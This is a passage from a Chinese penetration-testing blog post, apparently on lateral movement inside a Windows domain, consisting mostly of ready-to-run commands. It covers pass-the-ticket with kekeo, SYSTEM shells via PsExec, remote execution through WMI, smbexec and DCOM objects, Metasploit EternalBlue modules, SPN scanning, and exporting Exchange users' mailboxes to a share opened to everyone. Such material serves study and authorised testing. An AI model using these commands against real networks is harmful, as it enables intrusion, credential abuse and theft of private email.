+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">kekeo <span class="s2">&#34;kerberos::ptt xxx.kirbi&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="psexec-的使用">PsExec 的使用</h2>
+<h3 id="pstools-工具中的-psexec">PsTools 工具中的 PsExec</h3>
+<h4 id="建立-ipc-连接-1">建立 IPC 连接</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net use \\IP\ipc$ <span class="s2">&#34;password&#34;</span> /u:administrator
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="获取-system-权限的-交互式shell">获取 System 权限的 交互式shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">PsExec.exe -accepteula \\IP -s cmd.exe
+或
+PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig
+</code></pre></td></tr></table>
+</div>
+</div><p>如果不使用 -s 命令，则创建一个 Administrator 权限的 shell</p>
+<p>如果没有建立 IPC 连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">PsExec.exe -accepteula \\IP -u administrator -p password -s cmd.exe
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="metasploit-中的-psexec-模块">Metasploit 中的 psexec 模块</h3>
+<ul>
+<li>exploit/windows/smb/psexec</li>
+<li>exploit/windows/smb/psexec_psh（powershell 版本）</li>
+</ul>
+<h2 id="wmi-的使用">WMI 的使用</h2>
+<h3 id="基本命令">基本命令</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmic /node:IP /user:administrator /password:passed process call create <span class="s2">&#34;cmd.exe /c ipconfig &gt; ip.txt&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>建立 IPC 连接后，使用 type 命令读取结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">type</span> \\IP\C$\ip.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="impacket-包中的-wmiexec">impacket 包中的 wmiexec</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">wmiexec.py administrator:password@IP
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="wmiexecvbs">wmiexec.vbs</h3>
+<p>半交互式 shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">cscript.exe //nologo wmiexec.vbs /shell IP administrator password
+</code></pre></td></tr></table>
+</div>
+</div><p>执行单条命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">cscript.exe wmiexec.vbs /cmd IP administrator password <span class="s2">&#34;ipconfig&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>对于运行时间较长的命令，例如 <code>ping</code>、<code>systeminfo</code>，需要加入 <code>-wait 5000</code> 命令或者更长等待时间。在运行 <code>nc</code> 等不需要输出单需要一直等待运行的进程时，需要使用 <code>-persist</code> 参数。</p>
+<h3 id="invoke-wmicommand">Invoke-WmiCommand</h3>
+<p>powersploit工具包中</p>
+<p>将 <code>Invoke-Wmicommand.ps1</code> 导入系统</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$User</span> <span class="p">=</span> <span class="s2">&#34;pentest.hacker\administrator&#34;</span>
+
+<span class="nv">$Password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-String</span> <span class="s2">&#34;password&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+
+<span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">AutoMation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="nv">$User</span><span class="p">,</span> <span class="nv">$Password</span>
+
+<span class="nv">$Remote</span> <span class="p">=</span> <span class="nb">Invoke-WmiCommand</span> <span class="n">-Payload</span> <span class="p">{</span><span class="n">ipconfig</span><span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-ComputerName</span> <span class="n">IP</span>
+
+<span class="nv">$Remore</span><span class="p">.</span><span class="n">PayloadOutput</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="invoke-wmimethod">Invoke-WMIMethod</h3>
+<p>利用 <code>powershell</code> 自带的 <code>Invoke-WMIMethod</code> ，非交互，无回显。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$User</span> <span class="p">=</span> <span class="s2">&#34;pentest.hacker\administrator&#34;</span>
+
+<span class="nv">$Password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-String</span> <span class="s2">&#34;password&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+
+<span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">AutoMation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="n">-ArgumentList</span> <span class="nv">$User</span><span class="p">,</span> <span class="nv">$Password</span>
+
+<span class="nv">$Remote</span> <span class="p">=</span> <span class="nb">Invoke-WMIMethod</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-Name</span> <span class="n">Create</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;calc.exe&#34;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-ComputerName</span> <span class="n">IP</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="永恒之蓝漏洞">永恒之蓝漏洞</h2>
+<ul>
+<li>auxiliary/scanner/smb/smb_ms17_010</li>
+<li>exploit/windows/smb/ms17_010_eternalblue</li>
+</ul>
+<h2 id="smbexec">smbexec</h2>
+<h3 id="c-版本-smbexec">C++ 版本 smbexec</h3>
+<p>将 <code>execserver.exe</code> 上传到到目标系统的 <code>C:\Windows\</code> 目录下，解除 <code>UAC</code> 对命令的限制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net use \\IP <span class="s2">&#34;password&#34;</span> /user:pentest\administrator
+test.exe IP administrator password whoami c$
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="impacket-工具包中的-smbexecpy">impacket 工具包中的 smbexec.py</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">smbexec.py penteer/administrator:password\@IP
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="dcom-在远程系统中的使用">DCOM 在远程系统中的使用</h2>
+<h3 id="通过本地-dcom-执行命令">通过本地 DCOM 执行命令</h3>
+<h4 id="获取-dcom-程序列表">获取 DCOM 程序列表</h4>
+<p>windows server 2012 及以上</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-CimInstance</span> <span class="n">Win32_DCOMApplicatioon</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Windows 7、Windows Server 2008</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-WmicObject</span> <span class="n">-Namespace</span> <span class="n">ROOT</span><span class="p">\</span><span class="n">CIMV2</span> <span class="n">-Class</span> <span class="n">Win32_DCOMApplication</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="使用-dcom-执行任意命令">使用 DCOM 执行任意命令</h4>
+<p>本地启动一个管理员权限的 powershell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&#34;MMC20.Application&#34;</span><span class="p">,</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)).</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;/c calc.exe&#34;</span><span class="p">,</span><span class="s2">&#34;Minimzed&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="使用-dcom-在远程机器上执行命令">使用 DCOM 在远程机器上执行命令</h3>
+<p>远程连接时必须使用具有本地管理员权限的账号</p>
+<h4 id="使用-ipc-连接远程计算机">使用 IPC$ 连接远程计算机</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net use \\IP <span class="s2">&#34;password&#34;</span> /user:pentest.hacker\win7user
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="执行命令">执行命令</h4>
+<h5 id="调用-mmc20_application-远程执行命令">调用 MMC20_Application 远程执行命令</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$com</span><span class="p">=</span><span class="no">[Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&#34;MMC20.Application&#34;</span><span class="p">,</span><span class="s2">&#34;IP&#34;</span><span class="p">))</span>
+<span class="nv">$com</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="s2">&#34;/c calc.exe&#34;</span><span class="p">,</span><span class="s2">&#34;Minimzed&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="调用-9ba05972-f6a8-11cf-a442-00a0c90a8f39">调用 9BA05972-F6A8-11CF-A442-00A0C90A8F39</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$com</span><span class="p">=</span><span class="no">[Type]</span><span class="p">::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="s1">&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;</span><span class="p">,</span><span class="s2">&#34;IP&#34;</span><span class="p">)</span>
+<span class="nv">$obj</span><span class="p">=</span><span class="no">[System.Activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="nv">$com</span><span class="p">)</span>
+<span class="nv">$item</span><span class="p">=</span><span class="nv">$obj</span><span class="p">.</span><span class="n">item</span><span class="p">()</span>
+<span class="nv">$item</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span><span class="p">(</span><span class="s2">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="s2">&#34;/c calc.exe&#34;</span><span class="p">,</span><span class="s2">&#34;c:\windows\system32&#34;</span><span class="p">,</span><span class="s2">&#34;$null&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="spn-在域环境中的使用">SPN 在域环境中的使用</h2>
+<h3 id="spn-扫描">SPN 扫描</h3>
+<p>PowerShell-AD-Recon</p>
+<h4 id="利用-spn-发现域中所有的-mssql-服务">利用 SPN 发现域中所有的 MSSQL 服务</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Discover-PSMSSQLServer</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Discover-PSMSSQLServers</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="扫描域中所有的-spn-信息">扫描域中所有的 SPN 信息</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Discover-PSInterestingServices</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Discover-PSInterestingServices</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>在不使用第三方 Powershell 脚本的情况下，输入如下命令查询所有的 SPN 信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">setspn -T domain -q */*
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="exchange-邮件服务器攻击">Exchange 邮件服务器攻击</h3>
+<h3 id="exchange-服务发现">Exchange 服务发现</h3>
+<h4 id="基于端口扫描发现">基于端口扫描发现</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">nmap -A -O -sV IP
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="spn-查询">SPN 查询</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">setspn -T pentest.hacker -F -Q */*
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="exchange-的基本操作">Exchange 的基本操作</h3>
+<h4 id="查看邮件数据库">查看邮件数据库</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">add-pssnapin</span> <span class="n">microsoft</span><span class="p">.</span><span class="n">exchange</span><span class="p">*</span>
+<span class="nb">Get-MailboxDatabase</span> <span class="n">-server</span> <span class="s2">&#34;Exchange1&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>指定数据库，对其进行详细信息查询</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-MailboxDatabase</span> <span class="n">-Identify</span> <span class="s1">&#39;Mailbox Database 1894576043&#39;</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">Name</span><span class="p">,</span><span class="n">EdbFilePath</span><span class="p">,</span><span class="n">LogFolderPath</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="获取现有用户的邮件地址">获取现有用户的邮件地址</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-Mailbox</span> <span class="p">|</span> <span class="nb">format-tables</span> <span class="n">Name</span><span class="p">,</span><span class="n">WindowsEmailAddress</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="查看指定用户的邮箱使用信息">查看指定用户的邮箱使用信息</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-Mailboxstatistics</span> <span class="n">-identify</span> <span class="n">administrator</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">DisplayName</span><span class="p">,</span><span class="n">ItemCount</span><span class="p">,</span><span class="n">TotalItemSize</span><span class="p">,</span><span class="n">LastLogonTime</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="获取用户邮箱中的邮件数量">获取用户邮箱中的邮件数量</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-Mailbox</span> <span class="n">-ResultSize</span> <span class="n">Unlimited</span> <span class="p">|</span> <span class="nb">Get-MailboxStatistics</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">TotalItemSize</span> <span class="n">-Decend</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="导出指定的电子邮件">导出指定的电子邮件</h3>
+<h4 id="配置用户的导入导出权限">配置用户的导入、导出权限</h4>
+<h5 id="查看用户权限">查看用户权限</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-ManagementRoleAssignment</span> <span class="n">-role</span> <span class="s2">&#34;Mailbox Import Export&#34;</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">RoleAssigneeName</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="添加权限">添加权限</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-ManagementRoleAssignment</span> <span class="n">-Name</span> <span class="s2">&#34;Import Export_Domain Admins&#34;</span> <span class="n">-User</span> <span class="s2">&#34;Administrator&#34;</span> <span class="n">-Role</span> <span class="s2">&#34;Mailbox Import Export&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="删除权限">删除权限</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-ManagementRoleAssignment</span> <span class="s2">&#34;Import Export_Domain Admins&#34;</span> <span class="n">-Confirm</span><span class="err">:</span><span class="nv">$false</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="设置网络共享文件夹">设置网络共享文件夹</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd">net share inetpub=c:\inetpub /grant:everyone,full
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="导出用户的电子邮件">导出用户的电子邮件</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">New-MailboxExportRequest</span> <span class="n">-Mailbox</span> <span class="n">administrator</span> <span class="n">-FilePath</span> <span class="p">\\</span><span class="n">IP</span><span class="p">\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">administrator</span><span class="p">.</span><span class="n">pst</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="管理导出请求">管理导出请求</h4>
+<p>查看之前的导出记录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-MailboxExportRequest</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将指定用户的已完成导出请求删除</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Remove-MailboxExportRequest</span> <span class="n">-Identify</span> <span class="n">Administrator</span><span class="p">\</span><span class="n">mailboxexport</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>将所有已完成导出的请求删除</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-MailboxExportRequest</span> <span class="n">-Status</span> <span class="n">Completed</span> <span class="p">|</span> <span class="nb">Remove-MailboxExportRequest</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-02-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" data-title="域内横向移动分析"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" data-title="域内横向移动分析"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/" data-title="域内横向移动分析"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>,&nbsp;<a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="权限提升防御分析"><i class="fas fa-angle-left fa-fw"></i>权限提升防御分析</a>
+            <a href="/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现">CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
